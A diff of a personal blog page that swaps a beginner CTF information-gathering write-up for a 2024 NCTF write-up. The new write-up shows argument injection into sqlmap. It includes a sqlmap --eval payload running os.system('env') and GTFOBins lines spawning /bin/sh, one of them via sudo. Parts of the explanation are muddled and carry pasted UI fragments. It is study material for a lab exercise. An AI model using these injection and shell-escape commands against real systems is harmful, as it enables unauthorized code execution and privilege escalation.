@@ -19,32 +19,24 @@
   <meta name="author" content="sakula33">
   <meta name="keywords" content="">
   
-    <meta name="description" content="今后用这一系列的文章来记录做的web入门题目，正确能做完一大部分，加油！！！ 这篇文章是第一部分‘信息收集’，那么我们开始把！ 首先为了方便我的查看我先在这里放个小总结 小总结  源代码泄露  版本管理软件泄露： – git– svn 备份文件泄露： – index.php.swp    index.php.bak    index.php~ –www.zip 其他： – robots.txt">
+    <meta name="description" content="艰难的比赛，来跟着官方wp复现学习一下 1.sqlmap-master 首先查看题目，给了附件和环境。 首先打开环境，是一个类似于sqlmap的一个界面。 附件当中给了源代码，我们查看一下。  我们发现其中有一个很明显的subprocess.Popen()函数 (1)subprocess.Popen:（subprocess.popen是python标准库中的一个模块，用于启动和管理子进程。它可以执">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-web入门-part1">
-<meta property="og:url" content="https://sakula33.github.io/2025/03/21/ctfshow-web%E5%85%A5%E9%97%A8-part1/index.html">
+<meta property="og:title" content="2024NCTF">
+<meta property="og:url" content="https://sakula33.github.io/2025/03/25/2024NCTF/index.html">
 <meta property="og:site_name" content="sakula33">
-<meta property="og:description" content="今后用这一系列的文章来记录做的web入门题目，正确能做完一大部分，加油！！！ 这篇文章是第一部分‘信息收集’，那么我们开始把！ 首先为了方便我的查看我先在这里放个小总结 小总结  源代码泄露  版本管理软件泄露： – git– svn 备份文件泄露： – index.php.swp    index.php.bak    index.php~ –www.zip 其他： – robots.txt">
+<meta property="og:description" content="艰难的比赛，来跟着官方wp复现学习一下 1.sqlmap-master 首先查看题目，给了附件和环境。 首先打开环境，是一个类似于sqlmap的一个界面。 附件当中给了源代码，我们查看一下。  我们发现其中有一个很明显的subprocess.Popen()函数 (1)subprocess.Popen:（subprocess.popen是python标准库中的一个模块，用于启动和管理子进程。它可以执">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1301.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1401.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1402.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1601.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1602.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1603.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1801.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1802.png">
-<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/2001.png">
-<meta property="article:published_time" content="2025-03-21T09:38:22.000Z">
-<meta property="article:modified_time" content="2025-03-21T13:08:59.973Z">
+<meta property="og:image" content="https://sakula33.github.io/2025/03/25/2024NCTF/2024NCTF/sqlmaster1.png">
+<meta property="article:published_time" content="2025-03-25T09:12:07.000Z">
+<meta property="article:modified_time" content="2025-03-26T10:18:00.911Z">
 <meta property="article:author" content="sakula33">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1301.png">
+<meta name="twitter:image" content="https://sakula33.github.io/2025/03/25/2024NCTF/2024NCTF/sqlmaster1.png">
   
   
   
-  <title>ctfshow-web入门-part1 - sakula33</title>
+  <title>2024NCTF - sakula33</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -230,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ctfshow-web入门-part1"></span>
+            <span id="subtitle" data-typed-text="2024NCTF"></span>
           
         </div>
 
@@ -241,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-21 17:38" pubdate>
-          2025年3月21日 下午
+        <time datetime="2025-03-25 17:12" pubdate>
+          2025年3月25日 下午
         </time>
       </span>
     
@@ -264,7 +256,7 @@
         
         
         
-          12 分钟
+          11 分钟
         
       </span>
     
@@ -301,149 +293,130 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">ctfshow-web入门-part1</h1>
+            <h1 id="seo-header">2024NCTF</h1>
             
             
               <div class="markdown-body">
                 
-                <p>今后用这一系列的文章来记录做的web入门题目，正确能做完一大部分，加油！！！</p>
-<p>这篇文章是第一部分‘信息收集’，那么我们开始把！</p>
-<p>首先为了方便我的查看我先在这里放个小总结</p>
-<h1 id="小总结">小总结</h1>
-<b>
-<h2 id="源代码泄露">源代码泄露</h2>
+                <p>艰难的比赛，来跟着官方wp复现学习一下</p>
+<p>1.sqlmap-master</p>
+<p>首先查看题目，给了附件和环境。</p>
+<p>首先打开环境，是一个类似于sqlmap的一个界面。</p>
+<p>附件当中给了源代码，我们查看一下。</p>
+<p><img src="2024NCTF/sqlmaster1.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们发现其中有一个很明显的subprocess.Popen()函数</p>
+<p>(1)subprocess.Popen:<br>（subprocess.popen是python标准库中的一个模块，用于启动和管理子进程。它可以执行外部命令并捕获其输出。）</p>
+<p>以下是subprocess.Popen的典型用法：</p>
+<pre>
+<code>
+import subprocess
 
-<p>版本管理软件泄露：</p>
-<p>– git<br>– svn</p>
-<p>备份文件泄露：</p>
-<p>– index.php.swp<br>    index.php.bak<br>    index.php~</p>
-<p>–<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
-<p>其他：</p>
-<p>– robots.txt</p>
-</b>
+# 启动一个子进程，执行命令 "ls -l"
+process = subprocess.Popen(
+    ['ls', '-l'],                # 命令及其参数
+    stdout=subprocess.PIPE,      # 捕获标准输出
+    stderr=subprocess.STDOUT     # 将错误输出合并到标准输出
+)
 
-<h1 id="题目">题目</h1>
+# 读取命令的输出
+output, _ = process.communicate()
+print(output.decode())
+</code>
+</pre>
 
-<h2 id="web1">web1</h2>
+<p><b>args</b>:要执行的命令及其参数。可以是一个字符串列表（如<b>[‘ls’,’-l’]</b>）或者单个字符串（但需要设置shell&#x3D;True）.</p>
+<p><b>stdout和stderr</b>:分别指定标准输出和错误输出的处理方式。常见的值是subprocess.PIPE,表示捕获输出。</p>
+<p><b>shell</b>:是否通过系统 shell 执行命令。如果为 True，可以直接传递完整的命令字符串；如果为 False，需要传递一个参数列表。</p>
+<p>如果 shell&#x3D;True，则存在命令注入风险，因为用户输入可能会被直接拼接到 shell 命令中。<br>如果 shell&#x3D;False，则相对安全，但仍需确保用户输入的参数经过严格校验。</p>
+<p>学习了一下，那么回到这个题目，我们看到了设置了shell&#x3D;Flase,导致我们无法利用正常的命令注入</p>
+<p>但是我们可以看到我们可以控制sqlmap的参数，即参数注入。<br>结合GTFOBins:<br><b><br>Shell<br>它可用于通过生成交互式系统shell来摆脱受限环境</b></p>
+<pre>
+<code>
+sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
+</code>
 
-<p>首先打开靶机进行查看，只有一句话</p>
-<p>摁一下F12即可得到flag</p>
-<h2 id="web2">web2</h2>
+Sudo
+如果二进制文件被允许以超级用户身份运行sudo,它不会降低提升的权限，并且可能用于访问文件系统，升级或维护特权访问。
 
-<p>显示无法查看源代码</p>
-<p>我们在网址前面加上view-source:即可查看了</p>
-<p>或者我们使用ctrl+u的快捷方式来打开</p>
-<h2 id="web3">web3</h2>
+<code>
+sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"）
+</code>
+</pre>
 
-<p>看题目描述，让我们抓个包看看，那我们就使用bp抓包进行查看</p>
-<p>把他发送到repeater中，发送一下，flag就在返回的响应包中</p>
-<h2 id="web4">web4</h2>
+<p>通过–eval参数可以执行Python代码，然而因为上面command.split()默认是按空格分隔的，所以需要一些技巧绕过</p>
+<p>注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell&#x3D;False , 如果加上去反⽽代表的是 “eval ⼀个 Python 字符串”</p>
+<p>解释：</p>
+<pre>
+1. command.split() 的作用
+在后端代码中，command.split() 是用来将用户输入的字符串按空格分割成一个列表的。例如：
 
-<p>看题目描述，写着robots，那么就是查看robots协议了</p>
-<p>查看之后就得到了存放flag的文件名了，进行查看就得到了flag</p>
-<h2 id="web5">web5</h2>
+<code>
+command = f'sqlmap -u &#123;url&#125; --batch --flush-session'
+</code>
+如果用户输入的 url 是：
 
-<p>直接在查看index.phps就得到了flag了</p>
-<h2 id="web6">web6</h2>
+plaintext
+深色版本
+127.0.0.1:8000 --eval __import__('os').system('env')
+那么 command.split() 将会把整个命令分割成以下列表：
 
-<p>看题目描述，考虑源码泄露，查看一下<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
-<p>得到了一个压缩包，看i面一个index.php和一个f1000g,txt的文件</p>
-<p>这个txt文件就是存放flag的文件了，这样就得到了flag</p>
-<h2 id="web7">web7</h2>
+python
+深色版本
+['sqlmap', '-u', '127.0.0.1:8000', '--eval', '__import__(\'os\').system(\'env\')', '--batch', '--flush-session']
+注意点
+--eval 后面的内容（即 __import__('os').system('env')）会被当作一个整体参数传递给 sqlmap。
+这是因为 split() 默认以空格为分隔符，并且不会对内容进行额外处理。
+2. 为什么需要“一些小技巧来绕过”？
+由于 command.split() 按空格分割，恶意输入中的空格可能会导致参数解析错误。例如：
 
-<p>题目描述，版本控制很重要</p>
-<p>那么可以联想到版本管理软件泄露源代码</p>
-<p>包括</p>
-<p><b> git  和  svn </b></p>
-<p>那么我们分别进行查看，当我们查看url&#x2F;.git的时候就可以的到flag了</p>
-<h2 id="web8">web8</h2>
+plaintext
+深色版本
+127.0.0.1:8000 --eval __import__('os').system('whoami')
+这里的 --eval 参数值包含了空格（'os' 和 'whoami' 中的单引号和括号），这可能会导致 split() 错误地将参数分割成多个部分，从而破坏命令结构。
 
-<p>题目描述和上一个题是一样的<br>‘<br>那么我们就可以查看url&#x2F;.svn就可以得到flag了</p>
-<h2 id="web9">web9</h2>
+解决方法
+为了避免这种情况，我们需要确保 --eval 参数的值是一个完整的 Python 表达式，且不包含多余的空格或特殊字符。例如：
 
-<p>根据提示，在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件</p>
-<p>第一次意外退出生成的是.swp</p>
-<p>第二次意外退出生成的是.swo</p>
-<p>第三次为.swn</p>
-<p>因此可以尝试打开第一次退出时产生的这个文件，输入url&#x2F;index.php.swp</p>
-<h2 id="web10">web10</h2>
+plaintext
+深色版本
+127.0.0.1:8000 --eval __import__('os').system('env')
+这里的关键是：
 
-<p>查看题目提示说的是cookie中不能存放信息</p>
-<p>那么我们打开环境，直接进去查看cookie</p>
-<p>用bp抓包，这样就得到了flag</p>
-<h2 id="web11">web11</h2>
+使用 __import__ 动态导入模块，避免直接引用模块名。
+确保整个表达式没有多余的空格或换行。
+3. 为什么不需要加引号？
+在 Python 的 subprocess.Popen 中，shell=False 是默认设置。这意味着命令参数会直接传递给底层的操作系统调用，而不会经过 shell 解释。
 
-<p>通过dns检查查询flag <a target="_blank" rel="noopener" href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
-<p>查找flag.ctfshow.com域名下的txt记录</p>
-<h2 id="web12">web12</h2>
+(1) 如果加上引号会发生什么？
+假设我们在 --eval 参数值上加上引号，例如：
 
-<p>首先查看robots.txt发现了admin路由，查看</p>
-<p>让我们进行登录，那么密码是什么呢，这时候我们就可以看到题目给的提示了</p>
-<p>我们在主页进行查看，发现在主页下面有一个数字，那么我们就合理怀疑这个就是密码</p>
-<p>最后发现登录成功，得到flag</p>
-<h2 id="web13">web13</h2>
+plaintext
+深色版本
+127.0.0.1:8000 --eval "__import__('os').system('env')"
+后端代码会将其分割成以下列表：
 
-<p>在网站下面发现一个document</p>
-<p>进行查看发现一个后台网址和登录账号和密码</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1301.png" srcset="/img/loading.gif" lazyload></p>
-<p>登录之后得到flag</p>
-<h2 id="web14">web14</h2>
+python
+深色版本
+['sqlmap', '-u', '127.0.0.1:8000', '--eval', '"__import__(\'os\').system(\'env\')"', '--batch', '--flush-session']
+此时，--eval 的值变成了一个带有双引号的字符串：
 
-<p>题目提示：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
-<p>那么我们直接查看url&#x2F;editor</p>
-<p>发现是有一个上传连接，我们点进去看是目录</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1401.png" srcset="/img/loading.gif" lazyload></p>
-<p>一般默认配置都是在var&#x2F;www&#x2F;html里面找flag</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1402.png" srcset="/img/loading.gif" lazyload></p>
-<p>找到了</p>
-<h2 id="web15">web15</h2>
+plaintext
+深色版本
+"__import__('os').system('env')"
+这会导致 sqlmap 将整个字符串当作一个普通的 Python 字符串来执行，而不是实际运行其中的代码。
 
-<p>我们拿到题目之后看到最底下有一个邮箱，然后查看一下admin路由</p>
-<p>发现一个登录界面，我们首先输入admin，把这个邮箱的号码当作密码进行输入，发现不对哈</p>
-<p>那么我们就只能重置密码了</p>
-<p>发现有密保是问题是我在哪个城市</p>
-<p>我们从qq上进行搜索能发现他的所在地是在西安(但是现在搜不到了)</p>
-<p>这样我们就重置了密码哈接下来就是登录之后拿到了flag</p>
-<h2 id="web16">web16</h2>
+(2) 不加引号的正确行为
+如果不加引号，--eval 参数值会直接作为 Python 代码传递给 sqlmap，例如：
 
-<p>先查看题目提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1601.png" srcset="/img/loading.gif" lazyload></p>
-<p>根据大佬的文章得知了什么是探针泄露</p>
-<p>那么我们回归到这个题，我们访问tz.php</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1602.png" srcset="/img/loading.gif" lazyload></p>
-<p>我们在其中发现有phpinfo，那么我们接着查看一波（点击一下即可查看）</p>
-<p>最终我们也是在其中找到了flag</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1603.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="web17">web17</h2>
+plaintext
+深色版本
+127.0.0.1:8000 --eval __import__('os').system('env')
+后端代码会将其分割成以下列表：
 
-<p>首先查看题目提示：备份的sql文件会泄露敏感信息</p>
-<p>我们用dirsearch扫描一下，发现了backup.sql文件</p>
-<p>下载，查看，得到flag</p>
-<h2 id="web18">web18</h2>
-
-<p>打开发现是一个小游戏，我们用ctrl+u来进行查看，发现有一个js文件</p>
-<p>我们查看一下代码，发现其中有一个unicode的编码，我们解码一下</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1801.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/1802.png" srcset="/img/loading.gif" lazyload></p>
-<p>那么我们就查看一下101.php</p>
-<p>得到flag</p>
-<h2 id="web19">web19</h2>
-
-<p>首先我们查看题目提示：密钥什么的，就不要放在前端了</p>
-<p>估计解题的关键就是在前端了，使用ctrl+u进行查看</p>
-<p>发现了密码，我们使用post的方式进行传参就得到了flag</p>
-<h2 id="web20">web20</h2>
-
-<p>还是老样子，先查看题目提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了</p>
-<p>那我们还是用dirsearch来进行一下扫描</p>
-<p>最后扫描到了一个&#x2F;db&#x2F;db.mdb</p>
-<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part1/2001.png" srcset="/img/loading.gif" lazyload></p>
-<p>进行查看发现了flag</p>
-<h1 id="总结">总结</h1>
-
-<p>通过这个模块，我学习到了很多没见过的搜集信息的方法。</p>
-<p>相信以后会更好，加油把剩下的题目都给做完！！！</p>
-
+python
+深色版本
+['sqlmap', '-u', '127.0.0.1:8000', '--eval', '__import__(\'os\').system(\'env\')', '--batch', '--flush-session']
+此时，--eval 的值是一个合法的 Python 表达式，sqlmap 会在运行时执行它。</pre>
                 
               </div>
             
@@ -488,8 +461,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ctfshow-web入门-part1</div>
-      <div>https://sakula33.github.io/2025/03/21/ctfshow-web入门-part1/</div>
+      <div>2024NCTF</div>
+      <div>https://sakula33.github.io/2025/03/25/2024NCTF/</div>
     </div>
     <div class="license-meta">
       
@@ -501,7 +474,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月21日</div>
+          <div>2025年3月25日</div>
         </div>
       
       
@@ -533,18 +506,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/25/2024NCTF/" title="2024NCTF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">2024NCTF</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/20/ctfshow-web/" title="ctfshow-web">
-                        <span class="hidden-mobile">ctfshow-web</span>
+                      <a href="/2025/03/21/ctfshow-web%E5%85%A5%E9%97%A8-part1/" title="ctfshow-web入门-part1">
+                        <span class="hidden-mobile">ctfshow-web入门-part1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
